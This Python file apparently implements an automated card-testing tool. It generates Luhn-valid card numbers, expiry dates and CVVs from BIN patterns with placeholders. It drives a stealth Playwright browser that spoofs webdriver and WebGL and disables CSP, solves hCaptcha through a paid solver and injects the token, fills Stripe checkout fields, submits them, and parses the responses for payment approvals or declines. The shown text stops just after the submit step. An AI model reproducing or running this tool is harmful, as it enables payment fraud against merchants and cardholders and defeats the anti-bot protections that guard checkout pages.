import os
import asyncio
import json
import random
import re
import time
import base64
from datetime import datetime
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
from playwright._impl._errors import TargetClosedError
from flask import Flask, request, jsonify
from dotenv import load_dotenv
from collections import deque
import httpx
from urllib.parse import parse_qs
import traceback
from typing import Dict, List, Any, Optional
from contextlib import asynccontextmanager

load_dotenv()

CONFIG = {
    "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
    "TWOCAPTCHA_API_KEY": os.getenv('TWOCAPTCHA_API_KEY'),
    "RESPONSE_TIMEOUT_SECONDS": 45,
    "RETRY_DELAY": 1000,
    "RATE_LIMIT_REQUESTS": 10,
    "RATE_LIMIT_WINDOW": 60,
    "MAX_RETRIES": 3,
    "BROWSERLESS_TIMEOUT": 90000,
    "CAPTCHA_TIMEOUT": 180,
    "FAST_MODE": True,
    "LOG_REQUEST_BODIES": True,
    "RENDER_WAIT": 3000,  # Wait for full render
    "MAX_FRAME_RETRIES": 3,
    "NETWORK_IDLE_TIMEOUT": 5000
}

app = Flask(__name__)
request_timestamps = deque(maxlen=CONFIG["RATE_LIMIT_REQUESTS"])

# Enhanced 2Captcha solver with retry logic
class TwoCaptchaSolver:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "http://2captcha.com"
        self.client = httpx.AsyncClient(timeout=30.0)
        
    async def solve_hcaptcha(self, sitekey, page_url, max_retries=2):
        """Solve HCaptcha with retry logic"""
        if not self.api_key:
            print("[CAPTCHA] No 2captcha API key configured")
            return None
            
        for attempt in range(max_retries):
            print(f"[CAPTCHA] Attempt {attempt + 1}/{max_retries} - Submitting HCaptcha...")
            
            try:
                submit_data = {
                    'key': self.api_key,
                    'method': 'hcaptcha',
                    'sitekey': sitekey,
                    'pageurl': page_url,
                    'json': 1
                }
                
                response = await self.client.post(f"{self.base_url}/in.php", data=submit_data)
                result = response.json()
                
                if result.get('status') != 1:
                    print(f"[CAPTCHA] Submit failed: {result.get('error_text', 'Unknown error')}")
                    if attempt < max_retries - 1:
                        await asyncio.sleep(3)
                        continue
                    return None
                
                captcha_id = result.get('request')
                print(f"[CAPTCHA] Task ID: {captcha_id}")
                
                # Poll for result
                start_time = time.time()
                while time.time() - start_time < CONFIG["CAPTCHA_TIMEOUT"]:
                    await asyncio.sleep(5)
                    
                    check_url = f"{self.base_url}/res.php?key={self.api_key}&action=get&id={captcha_id}&json=1"
                    response = await self.client.get(check_url)
                    result = response.json()
                    
                    if result.get('status') == 1:
                        token = result.get('request')
                        print(f"[CAPTCHA] ✓ Solved! Token: {token[:30]}...")
                        return token
                    elif result.get('request') == 'CAPCHA_NOT_READY':
                        elapsed = int(time.time() - start_time)
                        print(f"[CAPTCHA] Solving... ({elapsed}s)")
                        continue
                    else:
                        print(f"[CAPTCHA] Error: {result.get('error_text', 'Unknown')}")
                        break
                
                print("[CAPTCHA] Timeout waiting for solution")
                
            except Exception as e:
                print(f"[CAPTCHA] Error on attempt {attempt + 1}: {e}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(3)
                    
        return None

# Enhanced Captcha Handler with better detection
class CaptchaHandler:
    @staticmethod
    async def detect_captcha(page, frame=None):
        """Comprehensive captcha detection"""
        context = frame or page
        
        try:
            # Check for various captcha types
            captcha_selectors = [
                'iframe[src*="hcaptcha.com"]',
                'iframe[src*="recaptcha"]',
                'iframe[src*="arkoselabs"]',
                'div[data-hcaptcha-widget-id]',
                '.h-captcha',
                '.g-recaptcha',
                '#cf-hcaptcha-container',
                'div[id*="captcha"]',
                'div[class*="captcha"]'
            ]
            
            for selector in captcha_selectors:
                element = await context.query_selector(selector)
                if element and await element.is_visible():
                    print(f"[CAPTCHA] Detected: {selector}")
                    return True
            
            # Check page content for captcha scripts
            content = await context.content()
            captcha_indicators = ['hcaptcha', 'recaptcha', 'challenge-platform', 'cf-captcha']
            for indicator in captcha_indicators:
                if indicator in content.lower():
                    print(f"[CAPTCHA] Script detected: {indicator}")
                    return True
                    
            return False
            
        except Exception as e:
            print(f"[CAPTCHA] Detection error: {e}")
            return False
    
    @staticmethod
    async def get_hcaptcha_sitekey(page, frame=None):
        """Enhanced sitekey extraction"""
        context = frame or page
        
        try:
            # Method 1: Direct attribute
            element = await context.query_selector('[data-sitekey]')
            if element:
                sitekey = await element.get_attribute('data-sitekey')
                if sitekey:
                    print(f"[CAPTCHA] Sitekey from attribute: {sitekey}")
                    return sitekey
            
            # Method 2: From iframe URL
            iframe = await context.query_selector('iframe[src*="hcaptcha.com"]')
            if iframe:
                src = await iframe.get_attribute('src')
                match = re.search(r'sitekey=([a-zA-Z0-9-]+)', src)
                if match:
                    sitekey = match.group(1)
                    print(f"[CAPTCHA] Sitekey from iframe: {sitekey}")
                    return sitekey
            
            # Method 3: From JavaScript
            try:
                sitekey = await context.evaluate('''
                    () => {
                        // Check window object
                        if (window.hcaptchaSitekey) return window.hcaptchaSitekey;
                        if (window.hcaptcha && window.hcaptcha.sitekey) return window.hcaptcha.sitekey;
                        
                        // Check all scripts
                        const scripts = document.scripts;
                        for (let script of scripts) {
                            const match = script.textContent.match(/sitekey['":\s]+['"]([a-zA-Z0-9-]+)['"]/);
                            if (match) return match[1];
                        }
                        
                        return null;
                    }
                ''')
                if sitekey:
                    print(f"[CAPTCHA] Sitekey from JS: {sitekey}")
                    return sitekey
            except:
                pass
            
            print("[CAPTCHA] Could not find sitekey")
            return None
            
        except Exception as e:
            print(f"[CAPTCHA] Sitekey extraction error: {e}")
            return None
    
    @staticmethod
    async def inject_captcha_token(page, token, frame=None):
        """Enhanced token injection"""
        context = frame or page
        
        try:
            # Comprehensive injection script
            injection_result = await context.evaluate(f'''
                (token) => {{
                    let injected = false;
                    
                    // Standard fields
                    const responseFields = [
                        '[name="h-captcha-response"]',
                        '[name="g-recaptcha-response"]',
                        'textarea[id*="captcha-response"]'
                    ];
                    
                    responseFields.forEach(selector => {{
                        const field = document.querySelector(selector);
                        if (field) {{
                            field.value = token;
                            field.innerHTML = token;
                            injected = true;
                        }}
                    }});
                    
                    // Trigger callbacks
                    const callbacks = [
                        'hcaptchaCallback',
                        'onHcaptchaCallback',
                        'captchaCallback',
                        'onCaptchaSuccess'
                    ];
                    
                    callbacks.forEach(cb => {{
                        if (typeof window[cb] === 'function') {{
                            window[cb](token);
                            injected = true;
                        }}
                    }});
                    
                    // Trigger hcaptcha object
                    if (typeof window.hcaptcha !== 'undefined') {{
                        if (window.hcaptcha.execute) {{
                            window.hcaptcha.execute();
                        }}
                        injected = true;
                    }}
                    
                    // Dispatch events
                    const events = ['hcaptcha-verified', 'captcha-solved'];
                    events.forEach(eventName => {{
                        const event = new CustomEvent(eventName, {{
                            detail: {{ response: token }},
                            bubbles: true,
                            cancelable: true
                        }});
                        document.dispatchEvent(event);
                    }});
                    
                    // Check for form submission
                    const forms = document.querySelectorAll('form');
                    forms.forEach(form => {{
                        const hiddenInput = form.querySelector('input[type="hidden"][name*="captcha"]');
                        if (hiddenInput) {{
                            hiddenInput.value = token;
                            injected = true;
                        }}
                    }});
                    
                    return injected;
                }}
            ''', token)
            
            if injection_result:
                print("[CAPTCHA] ✓ Token injected successfully")
            else:
                print("[CAPTCHA] Token injection may have failed")
                
            return True
            
        except Exception as e:
            print(f"[CAPTCHA] Injection error: {e}")
            return False

# Enhanced Response Analyzer
class UniversalResponseAnalyzer:
    @staticmethod
    def parse_request_body(body_data, content_type):
        """Parse request body based on content type"""
        if not body_data:
            return None
            
        try:
            if 'application/json' in content_type:
                return json.loads(body_data)
            elif 'application/x-www-form-urlencoded' in content_type:
                parsed = parse_qs(body_data)
                return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
            elif 'multipart/form-data' in content_type:
                return {"raw": body_data[:500], "type": "multipart"}
            else:
                return body_data[:1000] if len(body_data) > 1000 else body_data
                
        except Exception as e:
            return {"parse_error": str(e), "raw": body_data[:500] if body_data else ""}
    
    @staticmethod
    def analyze_request(url, method, headers, body_text, result_dict):
        """Enhanced request analysis"""
        domain = url.split('/')[2] if '/' in url else url
        endpoint = url.split('?')[0] if '?' in url else url
        
        content_type = headers.get('content-type', '') if headers else ''
        parsed_body = UniversalResponseAnalyzer.parse_request_body(body_text, content_type)
        
        request_data = {
            "type": "request",
            "url": url,
            "domain": domain,
            "endpoint": endpoint,
            "method": method,
            "timestamp": datetime.now().isoformat(),
            "headers": dict(headers) if headers else {},
            "body": parsed_body,
            "body_size": len(body_text) if body_text else 0
        }
        
        result_dict["raw_api_calls"].append(request_data)
        
        # Identify payment-related requests
        payment_keywords = [
            'stripe', 'payment', 'checkout', 'charge', 'token', 
            'card', 'pay', 'billing', 'purchase', 'transaction', 
            'order', 'square', 'paypal', 'braintree', 'authorize'
        ]
        
        is_payment_api = any(kw in url.lower() for kw in payment_keywords)
        
        if is_payment_api or method in ['POST', 'PUT', 'PATCH']:
            print(f"\n[API-REQUEST-{method}] {domain}")
            print(f"  URL: {endpoint[:80]}...")
            if parsed_body:
                body_str = json.dumps(parsed_body) if isinstance(parsed_body, dict) else str(parsed_body)
                print(f"  BODY: {body_str[:300]}...")
                
                # Extract important fields
                if isinstance(parsed_body, dict):
                    important_fields = [
                        'card', 'number', 'email', 'amount', 'currency',
                        'payment_method', 'client_secret', 'token', 'source'
                    ]
                    for field in important_fields:
                        if field in parsed_body:
                            result_dict[f"extracted_{field}"] = str(parsed_body[field])[:100]
                            print(f"    {field}: {str(parsed_body[field])[:100]}")
    
    @staticmethod
    def analyze_response(url, status, headers, body_text, result_dict):
        """Enhanced response analysis"""
        domain = url.split('/')[2] if '/' in url else url
        endpoint = url.split('?')[0] if '?' in url else url
        
        response_data = {
            "type": "response",
            "url": url,
            "domain": domain,
            "endpoint": endpoint,
            "status": status,
            "timestamp": datetime.now().isoformat(),
            "headers": dict(headers) if headers else {},
            "size": len(body_text) if body_text else 0
        }
        
        # Try to parse response
        try:
            data = json.loads(body_text)
            response_data["data"] = data
            response_data["content_type"] = "json"
        except:
            response_data["data"] = body_text[:1000] if body_text else ""
            response_data["content_type"] = "text"
        
        result_dict["raw_api_calls"].append(response_data)
        
        # Analyze payment status
        if response_data["content_type"] == "json":
            data = response_data["data"]
            
            # Check for success
            success_indicators = [
                data.get('status') in ['succeeded', 'success', 'complete', 'paid', 'approved', 'captured'],
                data.get('result') in ['success', 'approved', 'authorized'],
                data.get('payment_status') in ['paid', 'complete', 'success'],
                data.get('state') in ['approved', 'completed', 'captured'],
                data.get('captured') == True,
                data.get('approved') == True,
                data.get('paid') == True,
                data.get('success') == True,
                'success_url' in data,
                'confirmation' in data,
                'receipt' in data,
                'order_id' in data and data.get('status') != 'failed'
            ]
            
            if any(success_indicators):
                result_dict["payment_confirmed"] = True
                result_dict["success"] = True
                result_dict["message"] = f"Payment confirmed via {domain}"
                print(f"[✓✓✓ PAYMENT CONFIRMED] {domain} - {data.get('status', 'success')}")
                
                # Extract transaction details
                if 'id' in data:
                    result_dict["transaction_id"] = data['id']
                if 'amount' in data:
                    result_dict["amount"] = data['amount']
            
            # Check for errors
            error_indicators = [
                data.get('error'),
                data.get('error_message'),
                data.get('decline_code'),
                data.get('failure_reason'),
                data.get('status') in ['failed', 'declined', 'error', 'cancelled']
            ]
            
            for indicator in error_indicators:
                if indicator:
                    result_dict["error"] = str(indicator) if not isinstance(indicator, bool) else "Payment failed"
                    result_dict["success"] = False
                    print(f"[ERROR] {result_dict['error']}")
                    break
            
            # 3DS detection
            three_ds_indicators = [
                'three_d_secure' in str(data).lower(),
                'authentication' in str(data).lower(),
                'requires_action' in data,
                'next_action' in data,
                'redirect_to_url' in data
            ]
            
            if any(three_ds_indicators):
                result_dict["requires_3ds"] = True
                print("[3DS] Authentication required")

# Enhanced frame management
class FrameManager:
    @staticmethod
    async def get_all_frames(page, max_depth=3):
        """Recursively get all frames including nested ones"""
        all_frames = []
        
        async def collect_frames(frame, depth=0):
            if depth > max_depth:
                return
            all_frames.append(frame)
            for child in frame.child_frames:
                await collect_frames(child, depth + 1)
        
        await collect_frames(page.main_frame)
        return all_frames
    
    @staticmethod
    async def find_payment_frames(all_frames):
        """Identify frames likely to contain payment elements"""
        payment_frames = []
        payment_domains = [
            'stripe', 'checkout', 'payment', 'pay', 
            'square', 'paypal', 'braintree', 'authorize'
        ]
        
        for frame in all_frames:
            try:
                frame_url = frame.url.lower()
                if any(domain in frame_url for domain in payment_domains):
                    payment_frames.append(frame)
                    print(f"[FRAME] Payment frame: {frame.url[:80]}")
            except:
                continue
                
        return payment_frames

# Form filling utilities
class FormFiller:
    @staticmethod
    async def fill_element_safely(element, value, typing_delay=None):
        """Safely fill an element with error handling"""
        try:
            if not await element.is_visible():
                return False
                
            await element.scroll_into_view_if_needed()
            await element.click()
            await asyncio.sleep(0.1)
            
            # Clear existing value
            await element.evaluate('el => el.value = ""')
            
            # Type new value
            if typing_delay:
                for char in str(value):
                    await element.type(char, delay=typing_delay)
            else:
                await element.fill(str(value))
                
            return True
            
        except Exception as e:
            print(f"[FILL] Error: {e}")
            return False
    
    @staticmethod
    async def fill_card_fields(context, card, filled_status):
        """Fill card fields in a given context (page or frame)"""
        typing_delay = 20 if CONFIG['FAST_MODE'] else random.randint(30, 80)
        
        # Card number
        if not filled_status["card"]:
            card_selectors = [
                'input[placeholder*="1234" i]',
                'input[placeholder*="card" i]:not([placeholder*="holder"])',
                'input[name*="card" i]:not([name*="holder"])',
                'input[autocomplete="cc-number"]',
                'input[data-elements-stable-field-name="cardNumber"]',
                'input[id*="card-number" i]',
                'input[id*="cardnumber" i]',
                '#cardNumber'
            ]
            
            for selector in card_selectors:
                try:
                    elements = await context.query_selector_all(selector)
                    for element in elements:
                        if await FormFiller.fill_element_safely(element, card['number'], typing_delay):
                            filled_status["card"] = True
                            print(f"[CARD] ✓ {card['number']}")
                            break
                    if filled_status["card"]:
                        break
                except:
                    continue
        
        # Expiry
        if not filled_status["expiry"]:
            exp_string = f"{card['month']}/{card['year'][-2:]}"
            expiry_selectors = [
                'input[placeholder*="mm" i]',
                'input[placeholder*="exp" i]',
                'input[name*="exp" i]:not([name*="year"]):not([name*="month"])',
                'input[autocomplete="cc-exp"]',
                'input[data-elements-stable-field-name="cardExpiry"]',
                'input[id*="expiry" i]',
                '#cardExpiry'
            ]
            
            for selector in expiry_selectors:
                try:
                    elements = await context.query_selector_all(selector)
                    for element in elements:
                        if await FormFiller.fill_element_safely(element, exp_string, typing_delay):
                            filled_status["expiry"] = True
                            print(f"[EXPIRY] ✓ {exp_string}")
                            break
                    if filled_status["expiry"]:
                        break
                except:
                    continue
        
        # CVC/CVV
        if not filled_status["cvc"]:
            cvc_selectors = [
                'input[placeholder*="cvc" i]',
                'input[placeholder*="cvv" i]',
                'input[placeholder*="security" i]',
                'input[name*="cvc" i]',
                'input[name*="cvv" i]',
                'input[autocomplete="cc-csc"]',
                'input[data-elements-stable-field-name="cardCvc"]',
                'input[id*="cvc" i]',
                'input[id*="cvv" i]',
                '#cardCvc'
            ]
            
            for selector in cvc_selectors:
                try:
                    elements = await context.query_selector_all(selector)
                    for element in elements:
                        if await FormFiller.fill_element_safely(element, card['cvv'], typing_delay):
                            filled_status["cvc"] = True
                            print(f"[CVC] ✓ {card['cvv']}")
                            break
                    if filled_status["cvc"]:
                        break
                except:
                    continue
        
        return filled_status

# Enhanced wait utilities
async def smart_wait(page, base_ms=1000):
    """Intelligent waiting based on page state"""
    try:
        # Wait for basic stability
        await page.wait_for_timeout(base_ms)
        
        # Check for active animations
        animations_done = await page.evaluate('''
            () => {
                const animations = document.getAnimations();
                return animations.length === 0 || animations.every(a => a.playState !== 'running');
            }
        ''')
        
        if not animations_done:
            await page.wait_for_timeout(500)
            
        # Wait for network idle
        try:
            await page.wait_for_load_state('networkidle', timeout=CONFIG['NETWORK_IDLE_TIMEOUT'])
        except:
            pass
            
        return True
        
    except:
        return False

async def wait_for_payment_elements(page, timeout=10000):
    """Wait for payment elements to appear"""
    start = time.time()
    
    while (time.time() - start) * 1000 < timeout:
        try:
            # Check for various payment indicators
            payment_ready = await page.evaluate('''
                () => {
                    // Stripe
                    if (window.Stripe && document.querySelector('.StripeElement')) return true;
                    
                    // Generic payment forms
                    const cardInputs = document.querySelectorAll('input[placeholder*="card" i], input[name*="card" i]');
                    if (cardInputs.length > 0) return true;
                    
                    // iframes
                    const frames = document.querySelectorAll('iframe[src*="stripe"], iframe[src*="checkout"]');
                    if (frames.length > 0) return true;
                    
                    return false;
                }
            ''')
            
            if payment_ready:
                print("[WAIT] Payment elements ready")
                return True
                
        except:
            pass
            
        await asyncio.sleep(0.5)
    
    print("[WAIT] Timeout waiting for payment elements")
    return False

# Card utilities (unchanged from original)
def luhn_algorithm(number_str):
    total = 0
    reverse_digits = number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate):
            return candidate
    return None

def get_card_length(bin_str):
    first_two = bin_str[:2] if len(bin_str) >= 2 else ""
    return 15 if first_two in ['34', '37'] else 16

def get_cvv_length(card_number):
    return 4 if len(card_number) == 15 else 3

def random_digit():
    return str(random.randint(0, 9))

def generate_card_from_pattern(pattern):
    clean_pattern = re.sub(r'[^0-9x]', '', pattern, flags=re.IGNORECASE)
    card_length = get_card_length(clean_pattern.replace('x', '0'))
    
    result = ''
    for char in clean_pattern:
        if len(result) >= card_length - 1:
            break
        result += random_digit() if char.lower() == 'x' else char
    
    while len(result) < card_length - 1:
        result += random_digit()
    
    result = result[:card_length - 1]
    return complete_luhn(result) or result + '0'

def process_card_with_placeholders(number, month, year, cvv):
    processed_number = generate_card_from_pattern(number) if 'x' in number.lower() else number
    processed_month = str(random.randint(1, 12)).zfill(2) if 'x' in month.lower() else month.zfill(2)
    
    current_year = datetime.now().year
    if 'x' in year.lower():
        processed_year = str(random.randint(current_year + 1, current_year + 6))
    elif len(year) == 2:
        processed_year = '20' + year
    else:
        processed_year = year
    
    cvv_length = get_cvv_length(processed_number)
    processed_cvv = ''.join([random_digit() for _ in range(cvv_length)]) if 'x' in cvv.lower() else cvv
    
    return {
        "number": processed_number,
        "month": processed_month,
        "year": processed_year,
        "cvv": processed_cvv
    }

def process_card_input(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        return None
    return process_card_with_placeholders(*parts)

def generate_random_name():
    first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Avery', 'Quinn', 'Sage', 'Parker']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def rate_limit_check():
    now = time.time()
    while request_timestamps and request_timestamps[0] < now - CONFIG["RATE_LIMIT_WINDOW"]:
        request_timestamps.popleft()
    
    if len(request_timestamps) >= CONFIG["RATE_LIMIT_REQUESTS"]:
        oldest = request_timestamps[0]
        wait_time = CONFIG["RATE_LIMIT_WINDOW"] - (now - oldest)
        return False, wait_time
    
    request_timestamps.append(now)
    return True, 0

# Main automation function with enhanced error handling
async def run_stripe_automation(url, cc_string, email=None):
    card = process_card_input(cc_string)
    if not card:
        return {"error": "Invalid card format"}
    
    email = email or f"test{random.randint(1000,9999)}@example.com"
    random_name = generate_random_name()
    
    print(f"\n{'='*80}")
    print(f"[START] {datetime.now().strftime('%H:%M:%S')}")
    print(f"[CARD] {card['number']} | {card['month']}/{card['year']} | {card['cvv']}")
    print(f"[EMAIL] {email}")
    print(f"[MODE] {'FAST' if CONFIG['FAST_MODE'] else 'NORMAL'}")
    print('='*80)
    
    stripe_result = {
        "status": "pending",
        "raw_api_calls": [],
        "payment_confirmed": False,
        "token_created": False,
        "payment_method_created": False,
        "payment_intent_created": False,
        "success_url": None,
        "requires_3ds": False,
        "captcha_solved": False,
        "network_requests": 0,
        "network_errors": 0,
        "frames_checked": 0,
        "elements_filled": {}
    }
    
    analyzer = UniversalResponseAnalyzer()
    captcha_handler = CaptchaHandler()
    captcha_solver = TwoCaptchaSolver(CONFIG.get("TWOCAPTCHA_API_KEY"))
    frame_manager = FrameManager()
    form_filler = FormFiller()
    
    browser = None
    context = None
    page = None
    
    try:
        async with async_playwright() as p:
            # Enhanced browser setup
            browser_args = [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--allow-running-insecure-content',
                '--disable-popup-blocking',
                '--disable-content-security-policy',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-spki-list'
            ]
            
            # Browser connection with retry
            max_browser_retries = 3
            for attempt in range(max_browser_retries):
                try:
                    if CONFIG["RUN_LOCAL"]:
                        browser = await p.chromium.launch(
                            headless=False, 
                            slow_mo=50 if CONFIG['FAST_MODE'] else 100,
                            args=browser_args
                        )
                        print("[BROWSER] Local mode")
                        break
                    else:
                        print(f"[BROWSER] Connecting to Browserless (attempt {attempt + 1})...")
                        browser_url = f"wss://production-sfo.browserless.io/chromium/playwright?token={CONFIG['BROWSERLESS_API_KEY']}&timeout={CONFIG['BROWSERLESS_TIMEOUT']}"
                        browser = await p.chromium.connect(browser_url, timeout=30000)
                        print("[BROWSER] ✓ Connected")
                        break
                except Exception as e:
                    print(f"[BROWSER] Connection failed: {e}")
                    if attempt == max_browser_retries - 1:
                        # Fallback to local
                        browser = await p.chromium.launch(headless=True, args=browser_args)
                        print("[BROWSER] Fallback to local headless")
                    else:
                        await asyncio.sleep(2)
            
            # Enhanced context setup
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                locale='en-US',
                timezone_id='America/New_York',
                ignore_https_errors=True,
                bypass_csp=True,
                java_script_enabled=True,
                permissions=['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'],
                extra_http_headers={
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
            )
            
            # Advanced stealth scripts
            await context.add_init_script("""
                // Stealth mode
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
                
                // Chrome runtime
                window.chrome = {
                    runtime: {},
                    loadTimes: function() {},
                    csi: function() {},
                    app: {}
                };
                
                // Notification permission
                Object.defineProperty(navigator, 'permissions', {
                    get: () => ({
                        query: () => Promise.resolve({ state: 'granted' })
                    })
                });
                
                // WebGL vendor
                const getParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) {
                        return 'Intel Inc.';
                    }
                    if (parameter === 37446) {
                        return 'Intel Iris OpenGL Engine';
                    }
                    return getParameter(parameter);
                };
                
                // Frame communication
                window.addEventListener('message', function(e) {
                    if (e.data && e.data.type === 'stripe-frame-ready') {
                        console.log('Stripe frame ready');
                    }
                }, false);
            """)
            
            page = await context.new_page()
            
            # Network monitoring setup
            request_counter = {"count": 0}
            
            async def capture_request(request):
                try:
                    request_counter["count"] += 1
                    stripe_result["network_requests"] = request_counter["count"]
                    
                    url = request.url
                    method = request.method
                    headers = await request.all_headers()
                    
                    # Capture POST data
                    body_text = None
                    if method in ['POST', 'PUT', 'PATCH']:
                        try:
                            body = request.post_data
                            if body:
                                body_text = body
                                analyzer.analyze_request(url, method, headers, body_text, stripe_result)
                        except:
                            pass
                    
                    # Log important requests
                    if 'api' in url.lower() or 'payment' in url.lower():
                        print(f"[REQUEST-{method}] {url[:80]}...")
                        
                except Exception as e:
                    print(f"[REQUEST-ERROR] {str(e)[:100]}")
            
            async def capture_response(response):
                try:
                    url = response.url
                    status = response.status
                    headers = await response.all_headers()
                    
                    # Capture response body
                    try:
                        body = await response.body()
                        text = body.decode('utf-8', errors='ignore') if body else ""
                        analyzer.analyze_response(url, status, headers, text, stripe_result)
                    except:
                        analyzer.analyze_response(url, status, headers, "", stripe_result)
                        
                except Exception as e:
                    stripe_result["network_errors"] += 1
                    print(f"[RESPONSE-ERROR] {str(e)[:100]}")
            
            async def capture_request_failed(request):
                stripe_result["network_errors"] += 1
                print(f"[FAILED] {request.url[:50]}... - {request.failure}")
            
            # Attach handlers
            page.on("request", capture_request)
            page.on("response", capture_response)
            page.on("requestfailed", capture_request_failed)
            page.on("console", lambda msg: None)  # Suppress console logs for cleaner output
            page.on("pageerror", lambda error: print(f"[PAGE-ERROR] {str(error)[:100]}"))
            
            # Navigate with full rendering
            print("[NAV] Loading page...")
            try:
                response = await page.goto(url, wait_until="domcontentloaded", timeout=60000)
                if response:
                    print(f"[NAV] Response status: {response.status}")
            except PlaywrightTimeout:
                print("[NAV] Initial load timeout, continuing...")
            
            # Wait for full render
            print("[RENDER] Waiting for page to render...")
            await smart_wait(page, CONFIG['RENDER_WAIT'])
            
            # Wait for payment elements
            await wait_for_payment_elements(page)
            
            # Get all frames
            all_frames = await frame_manager.get_all_frames(page)
            payment_frames = await frame_manager.find_payment_frames(all_frames)
            stripe_result["frames_checked"] = len(all_frames)
            print(f"[FRAMES] {len(all_frames)} total, {len(payment_frames)} payment frames")
            
            # Check for captcha
            has_captcha = await captcha_handler.detect_captcha(page)
            if has_captcha:
                sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
                if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
                    token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
                    if token:
                        await captcha_handler.inject_captcha_token(page, token)
                        stripe_result["captcha_solved"] = True
                        await smart_wait(page, 2000)
            
            # Fill email first
            print("[FILL] Starting form filling...")
            email_filled = False
            email_selectors = [
                'input[type="email"]',
                'input[name="email"]',
                '#email',
                'input[placeholder*="email" i]',
                'input[id*="email" i]',
                'input[autocomplete="email"]',
                'input[aria-label*="email" i]'
            ]
            
            for selector in email_selectors:
                if email_filled:
                    break
                try:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        if await element.is_visible():
                            if await form_filler.fill_element_safely(element, email):
                                email_filled = True
                                stripe_result["elements_filled"]["email"] = True
                                print(f"[EMAIL] ✓ {email}")
                                break
                except:
                    continue
            
            # Fill name
            name_filled = False
            name_selectors = [
                'input[name*="name" i]:not([name*="email"])',
                'input[placeholder*="name" i]:not([placeholder*="email"])',
                '#cardholder-name',
                'input[autocomplete*="name"]',
                'input[aria-label*="name" i]'
            ]
            
            for selector in name_selectors:
                if name_filled:
                    break
                try:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        if await element.is_visible():
                            if await form_filler.fill_element_safely(element, random_name):
                                name_filled = True
                                stripe_result["elements_filled"]["name"] = True
                                print(f"[NAME] ✓ {random_name}")
                                break
                except:
                    continue
            
            # Fill card details with retries
            filled_status = {"card": False, "expiry": False, "cvc": False}
            
            for retry in range(CONFIG['MAX_FRAME_RETRIES']):
                if all(filled_status.values()):
                    break
                    
                print(f"[FILL] Card details attempt {retry + 1}/{CONFIG['MAX_FRAME_RETRIES']}")
                
                # Try main page first
                await form_filler.fill_card_fields(page, card, filled_status)
                
                # Then try each payment frame
                for frame in payment_frames:
                    if all(filled_status.values()):
                        break
                    try:
                        await form_filler.fill_card_fields(frame, card, filled_status)
                    except:
                        continue
                
                if not all(filled_status.values()):
                    await smart_wait(page, 1000)
            
            stripe_result["elements_filled"].update(filled_status)
            print(f"[FILLED] Status: {filled_status}")
            
            # Wait for validation
            await smart_wait(page, 2000)
            
            # Check for captcha after filling
            has_captcha_after = await captcha_handler.detect_captcha(page)
            if has_captcha_after and not stripe_result["captcha_solved"]:
                sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
                if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
                    token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
                    if token:
                        await captcha_handler.inject_captcha_token(page, token)
                        stripe_result["captcha_solved"] = True
                        await smart_wait(page, 1000)
            
            # Submit payment
            print("[SUBMIT] Looking for submit button...")
            payment_submitted = False
            
            submit_selectors = [
                'button[type="submit"]:visible',
                'button:has-text("pay"):visible',
                'button:has-text("submit"):visible',
                'button:has-text("complete"):visible',
                'button:has-text("confirm"):visible',
                'button:has-text("place"):visible',
                'button:has-text("checkout"):visible',
                'button:has-text("continue"):visible',
                'button.btn-primary:visible',
                'button.submit-button:visible',
                'input[type="submit"]:visible',
                '*[role="button"]:has-text("pay"):visible'
            ]
            
            for selector in submit_selectors:
                try:
                    btn = page.locator(selector).first
                    if await btn.count() > 0:
                        is_disabled = await btn.is_disabled()
                        if not is_disabled:
                            await btn.scroll_into_view_if_needed()
                            await btn.click()
                            payment_submitted = True
                            print(f"[SUBMIT] ✓ Clicked: {selector}")
                            break
                except:
                    continue
            
            if not payment_submitted:
                # Try JavaScript click
                try:
                    await page.evaluate('''
                        () => {
                            const buttons = document.querySelectorAll('button');
                            for (let btn of buttons) {
                                const text = btn.textContent.toLowerCase();
                                if (text.includes('pay') || text.includes('submit') || text.includes('complete')) {
                                    btn.click();
                                    return true;
                                }
                            }
                            return false;
                        }
                    ''')
                    payment_submitted = True
                    print("[SUBMIT] ✓ JavaScript click")
                except:
                    pass
            
            if not payment_submitted:
                # Last resort: Enter key
                await page.keyboard.press('Enter')
                payment_submitted = True
                print("[SUBMIT] ✓ Enter key pressed")
